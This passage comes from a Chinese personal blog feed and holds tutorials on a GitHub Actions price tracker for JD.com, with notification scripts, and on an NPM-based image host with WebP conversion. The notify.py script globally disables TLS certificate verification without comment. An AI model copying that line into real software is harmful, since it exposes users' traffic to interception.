src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span 